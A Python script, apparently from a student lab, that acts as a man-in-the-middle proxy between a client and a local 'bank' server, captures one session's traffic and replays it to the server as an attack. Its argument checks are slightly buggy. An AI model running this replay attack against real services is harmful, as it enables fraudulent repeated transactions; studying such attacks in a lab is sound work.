import sys, os
# directory reach
current = os.path.dirname(os.path.realpath(__file__))
# setting path
parent = os.path.dirname(current)
sys.path.append(parent)
from subprocess import *
from MITMConnection import *
from utils import *
from Grupo1Replay.MITMFuncs import *

def main(argv):

    argv = stringToArgs("".join(argv))

    # Terminal line inputs
    mitmPort        = argv[argv.index("-p")+1] if "-p" in argv else 4000
    serverIpAddress = argv[argv.index("-s")+1] if "-i" in argv else "127.0.0.1"
    serverPort      = argv[argv.index("-q")+1] if "-p" in argv else 3000

    try:

        print(f"MITM started in port {mitmPort}")

        # Connection 1
        clientSocket = createSocket(port=mitmPort)
        conn, addr = clientSocket.accept()
        conn.setblocking(0)

        print("Client connected")

        bankSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        bankSocket.connect((serverIpAddress, serverPort))

        proxyConnection(conn,bankSocket, 15)

        bankSocket.close()
        clientSocket.close()

        # Connection 2

        clientSocket = createSocket(port=mitmPort)
        conn, addr = clientSocket.accept()
        conn.setblocking(0)

        print("Client connected")

        bankSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        bankSocket.connect((serverIpAddress, serverPort))

        traceList = []
        traceList = proxyConnection(conn,bankSocket, 10, traceList)

        bankSocket.close()
        clientSocket.close()

        # Replay attack
        print("Starting attack")

        bankSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        bankSocket.connect((serverIpAddress, serverPort))

        replay(bankSocket,traceList)

        #call(["python3", "MITM/clearFiles.py"])
        #bankSocket.close()
        #clientSocket.close()

  
        


    except KeyboardInterrupt:
        print("Ended Properly\n")

        call(["python3", "MITM/clearFiles.py"])

        if "bankSocket" in locals():
            bankSocket.close()
        
        if "clientSocket" in locals():
            clientSocket.close()


if __name__ == "__main__":
    main(sys.argv[1:])